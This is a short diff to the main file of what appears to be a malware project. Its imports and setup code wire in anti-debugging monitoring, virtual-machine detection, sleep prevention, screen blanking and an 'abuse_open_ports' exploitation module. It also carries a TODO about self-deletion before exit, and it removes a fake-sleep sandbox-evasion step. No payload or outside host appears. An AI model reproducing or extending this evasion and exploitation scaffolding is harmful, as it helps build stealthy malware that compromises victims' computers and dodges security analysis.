@@ -5,14 +5,10 @@ from Utils.helpers import is_python_exist,is_online,find_python_path,is_admin
 from threading import Thread
 from Evasion import debugEvasion,vmDetect
 from Evasion.utils import is_normal_browser_user,get_idle_duration,prevent_sleep,turn_screen_off
-from multiprocessing import Process
-from os import getpid
-from Evasion.SleepFaker import FakeSleep
 from Exploitation.common import abuse_open_ports
 #//TODO: instead of sys.exit. spawn subprocess to delete the whole thing before.
 def main():
     Thread(target=debugEvasion.process_monitor,args=()).start()
-    #Process(target=FakeSleep,args=(getpid(),)).start() #//TODO: chech if this work and this is not child process
     debug = True #if true -- vm evasion will result only in printing!
     vm_flag = sys.exit if not debug else lambda x: print(x)
     prevent_sleep()
